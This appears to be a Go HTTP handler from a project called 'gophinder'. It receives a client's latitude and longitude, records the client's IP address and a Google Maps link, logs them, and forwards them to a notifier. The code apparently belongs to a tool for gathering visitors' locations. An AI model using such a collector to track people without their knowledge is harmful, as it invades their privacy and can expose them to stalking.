package handler

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"

	"gophinder/internal/logging"
	"gophinder/internal/notifier"
	"gophinder/utils"
)

type LocationData struct {
	Lat float64 `json:"lat"`
	Lon float64 `json:"lon"`
}

func HandleTrack(notifier notifier.Notifier) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		var data LocationData
		if err := json.NewDecoder(r.Body).Decode(&data); err != nil {
			log.Printf("JSON decode error: %v", err)
			http.Error(w, "Bad Request", http.StatusBadRequest)
			return
		}

		ip := utils.GetIP(r)
		fields := map[string]string{
			"IP Address":  ip,
			"Latitude":    fmt.Sprintf("%.6f", data.Lat),
			"Longitude":   fmt.Sprintf("%.6f", data.Lon),
			"Google Maps": fmt.Sprintf("https://maps.google.com/?q=%.6f,%.6f", data.Lat, data.Lon),
		}
		logging.LogBlock("Location Log", fields)
		if notifier != nil {
			go notifier.Notify("Location Log", fields)
		}
		w.WriteHeader(http.StatusOK)
	}
}
